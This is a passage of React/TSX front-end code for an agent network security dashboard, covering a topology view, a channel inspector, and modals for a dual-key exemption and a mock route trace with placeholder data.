                        stroke={strokeColor}
                        strokeWidth={isSelected ? 3.5 : isConnected ? 2.5 : 1.8}
                        strokeDasharray={
                          edge.state === 'blocked'
                            ? '8 5'
                            : edge.state === 'isolated'
                            ? '6 8'
                            : edge.state === 'review'
                            ? '6 4'
                            : undefined
                        }
                        markerEnd={markerUrl}
                      />

                      {/* Glowing particle animated along verified path */}
                      {motionEnabled && edge.state === 'verified' && (
                        <circle r="3.5" fill="#65e5db" className="data-particle">
                          <animateMotion dur="2.4s" repeatCount="indefinite" path={path} />
                        </circle>
                      )}

                      {/* Center Badge / Marker */}
                      <g className="edge-marker-label" transform={`translate(${mx}, ${my})`}>
                        <rect
                          x="-58"
                          y="-11"
                          width="116"
                          height="22"
                          rx="4"
                          className={`edge-label-bg label-bg-${edge.state}`}
                        />
                        <text x="0" y="3.5" textAnchor="middle" className="edge-label-text">
                          {edge.latency !== 'n/a' ? `${edge.latency} · ${edge.label.slice(0, 14)}` : edge.label}
                        </text>
                      </g>
                    </g>
                  );
                })}
              </svg>

              {/* Render Node Cards as HTML overlays */}
              {networkNodes.map((node) => {
                const agent = agentMap.get(node.id);
                const isSelected = selectedNodeId === node.id;
                const isHighlighted = connectedNodeIds.has(node.id);

                let statusBadge = 'ACTIVE';
                let statusClass = 'node-status-active';

                if (node.kind === 'gateway') {
                  statusBadge = 'INGRESS PROXY';
                  statusClass = 'node-status-gateway';
                } else if (node.kind === 'storage') {
                  statusBadge = 'WORM VAULT';
                  statusClass = 'node-status-storage';
                } else if (node.kind === 'sandbox' || agent?.status === 'quarantined') {
                  statusBadge = 'AIR-GAPPED';
                  statusClass = 'node-status-quarantined';
                } else if (agent?.status === 'restricted') {
                  statusBadge = 'RESTRICTED';
                  statusClass = 'node-status-restricted';
                }

                return (
                  <article
                    key={node.id}
                    className={`topology-node-card node-kind-${node.kind} ${
                      isSelected ? 'node-selected' : ''
                    } ${isHighlighted ? 'node-highlighted' : ''}`}
                    style={{ left: `${node.x}px`, top: `${node.y}px` }}
                    onClick={() => handleSelectNode(node)}
                    title={`Click to inspect ${node.id}`}
                  >
                    <div className="node-card-top">
                      <span className="node-tier-tag">{node.tier}</span>
                      <span className={`node-status-pill ${statusClass}`}>
                        <i /> {statusBadge}
                      </span>
                    </div>

                    <div className="node-card-middle">
                      <div className="node-icon-wrap">
                        {node.kind === 'gateway' ? (
                          <Server size={16} />
                        ) : node.kind === 'storage' ? (
                          <HardDrive size={16} />
                        ) : node.kind === 'sandbox' ? (
                          <ShieldAlert size={16} />
                        ) : (
                          <Cpu size={16} />
                        )}
                      </div>
                      <div className="node-info">
                        <strong>{node.id}</strong>
                        <small>{node.name}</small>
                      </div>
                    </div>

                    <div className="node-card-bottom">
                      <span>{node.model}</span>
                      <strong>{agent ? `Trust ${agent.trust}/100` : node.ip}</strong>
                    </div>

                    {/* Ring highlight when selected */}
                    {isSelected && <span className="node-selected-halo" />}
                  </article>
                );
              })}

              {/* Ping Radar Animation */}
              {pingWaveActive && (
                <div className="ping-radar-overlay">
                  <span className="radar-circle circle-1" />
                  <span className="radar-circle circle-2" />
                  <span className="radar-circle circle-3" />
                </div>
              )}
            </div>
          </div>

          {/* Canvas Footer Controls */}
          <footer className="topology-controls">
            <div className="topology-zoom-group">
              <button onClick={() => setZoom((z) => Math.min(z + 0.1, 1.4))} title="Zoom In">
                <Plus size={14} />
              </button>
              <button onClick={() => setZoom((z) => Math.max(z - 0.1, 0.65))} title="Zoom Out">
                <Minus size={14} />
              </button>
              <button onClick={() => setZoom(1)} className="zoom-reset-btn">
                {Math.round(zoom * 100)}% · Reset
              </button>
              <button onClick={() => setZoom(0.85)} className="zoom-fit-btn">
                Fit View
              </button>
            </div>

            <div className="topology-legend">
              <span className="legend-item">
                <i className="legend-verified" /> Verified mTLS
              </span>
              <span className="legend-item">
                <i className="legend-review" /> HITL Review Required
              </span>
              <span className="legend-item">
                <i className="legend-blocked" /> Policy Intercepted
              </span>
              <span className="legend-item">
                <i className="legend-isolated" /> Air-Gapped / Severed
              </span>
            </div>

            <div className="topology-status-foot">
              <span>eBPF KERNEL ENFORCEMENT · ZERO UNENCRYPTED TRANSIT</span>
            </div>
          </footer>
        </article>

        {/* 5. Deep-Dive Inspector Panel (Right Column) */}
        <aside className="network-inspector">
          {/* Header */}
          <header className="inspector-header">
            <div>
              <span className="inspector-title">INTER-AGENT BUS INSPECTOR</span>
              <small>Selected channel / node telemetry</small>
            </div>
            <span className={`inspector-state-badge state-${selectedEdge.state}`}>
              <i /> {selectedEdge.state.toUpperCase()}
            </span>
          </header>

          {/* Route Display */}
          <div className="inspector-route-box">
            <div className="route-party">
              <span className="party-role">{selectedFromNode?.tier}</span>
              <strong>{selectedFromNode?.id}</strong>
              <small>{selectedFromNode?.name}</small>
            </div>
            <div className="route-arrow-wrap">
              <ArrowRight size={18} />
              <span className="route-proto">{selectedEdge.protocol}</span>
            </div>
            <div className="route-party">
              <span className="party-role">{selectedToNode?.tier}</span>
              <strong>{selectedToNode?.id}</strong>
              <small>{selectedToNode?.name}</small>
            </div>
          </div>

          {/* Channel Telemetry Metrics */}
          <div className="inspector-metrics-grid">
            <div className="metric-box">
              <span>PROTOCOL</span>
              <strong>{selectedEdge.protocol}</strong>
            </div>
            <div className="metric-box">
              <span>TRANSIT LATENCY</span>
              <strong>{selectedEdge.latency}</strong>
            </div>
            <div className="metric-box">
              <span>MESSAGE RATE</span>
              <strong>{selectedEdge.messages}</strong>
            </div>
            <div className="metric-box">
              <span>CIPHER SUITE</span>
              <strong className="cipher-text">{selectedEdge.cipher}</strong>
            </div>
          </div>

          {/* Semantic Packet & Intent Inspection */}
          <section className="inspector-packet-section">
            <div className="section-label-row">
              <ShieldAlert size={14} />
              <strong>SEMANTIC PACKET INSPECTION</strong>
              {selectedEdge.risk !== undefined && (
                <span className={`risk-tag ${selectedEdge.risk >= 80 ? 'risk-high' : ''}`}>
                  RISK {selectedEdge.risk} / 100
                </span>
              )}
            </div>

            <div className="intent-box">
              <span className="box-sub">SYNTHESIZED NEURAL INTENT:</span>
              <p>{selectedEdge.intent}</p>
            </div>

            {selectedEdge.payload && (
              <div className="payload-box">
                <span className="box-sub">INTERCEPTED CALL PAYLOAD:</span>
                <code>{selectedEdge.payload}</code>
              </div>
            )}

            <div className="policy-rule-row">
              <span className="rule-label">ENFORCED POLICY:</span>
              <code>{selectedEdge.rule ?? 'SCOPED-ALLOW-TRANSIT-DEFAULT'}</code>
            </div>
          </section>

          {/* Selected Agent Node Profile Card */}
          <section className="inspector-agent-card">
            <div className="agent-card-head">
              <Fingerprint size={15} />
              <strong>FOCUSED AGENT: {selectedNode.id}</strong>
            </div>

            <div className="agent-card-body">
              <div className="agent-detail-row">
                <span>Model &amp; Role:</span>
                <strong>{selectedNode.model} · {selectedNode.role}</strong>
              </div>
              <div className="agent-detail-row">
                <span>Cluster Enclave:</span>
                <strong>{selectedNode.cluster} ({selectedNode.ip})</strong>
              </div>
              <div className="agent-detail-row">
                <span>Current Posture:</span>
                <strong style={{ color: selectedAgent?.status === 'quarantined' ? '#ff8577' : '#65e5db' }}>
                  {selectedAgent?.status ? selectedAgent.status.toUpperCase() : 'EXTERNAL / STORAGE'}
                  {selectedAgent?.trust ? ` (Trust ${selectedAgent.trust}/100)` : ''}
                </strong>
              </div>
            </div>

            {selectedAgent && (
              <div className="agent-card-actions">
                <button
                  className="agent-detail-btn"
                  onClick={() => onOpenAgentDetail(selectedAgent.id)}
                >
                  <Eye size={13} />
                  <span>Open Full Agent Detail</span>
                  <ChevronRight size={13} />
                </button>

                <button
                  className={selectedAgent.status === 'quarantined' ? 'btn-release' : 'btn-quarantine'}
                  onClick={() => handleToggleQuarantineAgent(selectedAgent.id)}
                >
                  <ShieldAlert size={13} />
                  <span>
                    {selectedAgent.status === 'quarantined' ? 'Lift Quarantine' : 'Quarantine Agent'}
                  </span>
                </button>
              </div>
            )}
          </section>

          {/* Tactical Link Operations */}
          <div className="inspector-actions">
            <button
              className={`action-btn-sever ${severedEdges.includes(selectedEdge.id) ? 'btn-severed-active' : ''}`}
              onClick={() => handleSeverEdge(selectedEdge.id)}
            >
              <Ban size={15} />
              <span>{severedEdges.includes(selectedEdge.id) ? 'Restore Channel Handshake' : 'Sever Channel (Air-Gap)'}</span>
            </button>

            <div className="dual-action-row">
              <button
                className="action-btn-secondary"
                onClick={() => handleEscalateEdge(selectedEdge.id)}
              >
                <ArrowUpRight size={14} />
                <span>Escalate to SOC</span>
              </button>

              <button
                className="action-btn-secondary"
                onClick={() => setQuorumModalOpen(true)}
              >
                <LockKeyhole size={14} />
                <span>2-Man Exemption</span>
              </button>
            </div>
          </div>

          {/* Quick Jump Channel History */}
          <div className="inspector-history">
            <h3>ACTIVE TOPOLOGY CHANNELS</h3>
            <div className="channel-quick-list">
              {computedEdges.slice(0, 6).map((edge) => (
                <button
                  key={edge.id}
                  className={`channel-item-btn ${selectedEdgeId === edge.id ? 'channel-active' : ''}`}
                  onClick={() => handleSelectEdge(edge)}
                >
                  <div className="ch-left">
                    <strong>{edge.from} → {edge.to}</strong>
                    <small>{edge.protocol} · {edge.latency}</small>
                  </div>
                  <span className={`ch-state state-${edge.state}`}>
                    {edge.state.slice(0, 4).toUpperCase()}
                  </span>
                </button>
              ))}
            </div>
          </div>
        </aside>
      </section>

      {/* =====================================================================
          6. INTERACTIVE MODALS
          ===================================================================== */}

      {/* Modal 1: 2-Man Quorum Exemption Modal */}
      {quorumModalOpen && (
        <div className="network-modal-backdrop" onClick={() => setQuorumModalOpen(false)} role="presentation">
          <section
            aria-labelledby="quorum-title"
            aria-modal="true"
            className="network-review-modal"
            onClick={(e) => e.stopPropagation()}
            role="dialog"
          >
            <button
              aria-label="Close review modal"
              className="network-modal-close"
              onClick={() => setQuorumModalOpen(false)}
            >
              <X size={18} />
            </button>

            <div className="modal-head">
              <span className="modal-icon-wrap">
                <LockKeyhole size={22} />
              </span>
              <div>
                <span className="modal-kicker">FIPS 140-3 SECURITY GATE</span>
                <h2 id="quorum-title">2-Man Quorum Channel Exemption</h2>
              </div>
            </div>

            <p className="modal-desc">
              Requesting cryptographic bypass for channel <strong>{selectedFromNode?.id} → {selectedToNode?.id}</strong>.
              Requires secondary hardware authorization key from an authenticated DevSecOps commander.
            </p>

            <div className="quorum-spec-box">
              <div className="spec-row">
                <span>Target Channel:</span>
                <strong>{selectedFromNode?.id} → {selectedToNode?.id}</strong>
              </div>
              <div className="spec-row">
                <span>Protocol &amp; Rule:</span>
                <strong>{selectedEdge.protocol} ({selectedEdge.rule ?? 'DEFAULT_FILTER'})</strong>
              </div>
              <div className="spec-row">
                <span>Lease Duration:</span>
                <strong>15 Minutes (Ephemeral Token)</strong>
              </div>
              <div className="spec-row">
                <span>Authorization Hash:</span>
                <code style={{ fontSize: '9px', color: 'var(--cyan)' }}>
                  0x9f4a8b2c1d3e5f7a089b4c2e1f8a9b0c2d3e4f5a6b
                </code>
              </div>
            </div>

            <div className="quorum-keys-row">
              <div className="key-slot key-signed">
                <CheckCircle2 size={16} />
                <div>
                  <strong>Col. Marcus Vance (CISO)</strong>
                  <small>Key 1 Signed via FIDO2 WebAuthn</small>
                </div>
              </div>

              <div
                className={`key-slot ${secOpsSignerActive ? 'key-signed' : 'key-pending'}`}
                onClick={() => setSecOpsSignerActive((prev) => !prev)}
                style={{ cursor: 'pointer' }}
                title="Click to toggle secondary signature"
              >
                {secOpsSignerActive ? <CheckCircle2 size={16} /> : <Key size={16} />}
                <div>
                  <strong>SecOps Quorum Validator #2</strong>
                  <small>{secOpsSignerActive ? 'Signed (Elena Rostova)' : 'Click to sign with Key-2'}</small>
                </div>
              </div>
            </div>

            <div className="modal-btn-row">
              <button
                className="btn-modal-cancel"
                onClick={() => setQuorumModalOpen(false)}
              >
                Cancel
              </button>
              <button
                className="btn-modal-submit"
                disabled={!secOpsSignerActive}
                onClick={() => {
                  setQuorumModalOpen(false);
                  onNotify(`2-Man Quorum approved for ${selectedFromNode?.id} → ${selectedToNode?.id}. 15-minute lease granted.`);
                }}
              >
                Commit Dual-Key Exemption
              </button>
            </div>
          </section>
        </div>
      )}

      {/* Modal 2: Route Trace & Probe Modal */}
      {routeProbeModalOpen && (
        <div className="network-modal-backdrop" onClick={() => setRouteProbeModalOpen(false)} role="presentation">
          <section
            aria-labelledby="probe-title"
            aria-modal="true"
            className="network-review-modal probe-modal"
            onClick={(e) => e.stopPropagation()}
            role="dialog"
          >
            <button
              aria-label="Close probe modal"
              className="network-modal-close"
              onClick={() => setRouteProbeModalOpen(false)}
            >
              <X size={18} />
            </button>

            <div className="modal-head">
              <span className="modal-icon-wrap" style={{ color: 'var(--cyan)' }}>
                <Terminal size={22} />
              </span>
              <div>
                <span className="modal-kicker">PACKET TRANSIT PROBE</span>
                <h2 id="probe-title">Inter-Agent Route Latency Tracer</h2>
              </div>
            </div>

            <p className="modal-desc">
              Active test probe tracing live packets through the multi-agent bus from Gateway ingress to production storage.
            </p>

            <div className="route-trace-hops">
              <div className="trace-hop hop-verified">
                <span className="hop-num">HOP 01</span>
                <div className="hop-body">
                  <strong>USER-GATEWAY → RES-AGENT-01</strong>
                  <span>mTLS 1.3 Handshake OK · Latency: 0.85 ms</span>
                </div>
                <Check size={16} />
              </div>

              <div className="trace-hop hop-verified">
                <span className="hop-num">HOP 02</span>
                <div className="hop-body">
                  <strong>RES-AGENT-01 → FIN-AGENT-01</strong>
                  <span>Vector RPC Semantic Handoff · Latency: 0.92 ms</span>
                </div>
                <Check size={16} />
              </div>

              <div className="trace-hop hop-blocked">
                <span className="hop-num">HOP 03</span>
                <div className="hop-body">
                  <strong>FIN-AGENT-01 → DB-AGENT-01</strong>
                  <span>Intent Firewall AST Intercept: Mutation Blocked (0.12 ms)</span>
                </div>
                <ShieldAlert size={16} />
              </div>

              <div className="trace-hop hop-verified">
                <span className="hop-num">HOP 04</span>
                <div className="hop-body">
                  <strong>FIN-AGENT-01 → ENTERPRISE-STORAGE</strong>
                  <span>Read-Only Re-Route Verified · Latency: 1.45 ms</span>
                </div>
                <Check size={16} />
              </div>
            </div>

            <div className="probe-summary-box">
              <div className="sum-stat">
                <span>Total Transit Time:</span>
                <strong>3.34 ms</strong>
              </div>
              <div className="sum-stat">
                <span>SLA Budget:</span>
                <strong style={{ color: 'var(--green)' }}>Passing (5.00ms max)</strong>
              </div>
              <div className="sum-stat">
                <span>Zero-Trust Integrity:</span>
                <strong style={{ color: 'var(--cyan)' }}>100% Sealed</strong>
              </div>
            </div>

            <button
              className="btn-modal-submit"
              style={{ width: '100%' }}
              onClick={() => setRouteProbeModalOpen(false)}
            >
              Close Tracer
            </button>
          </section>
        </div>
      )}
    </div>
  );
}
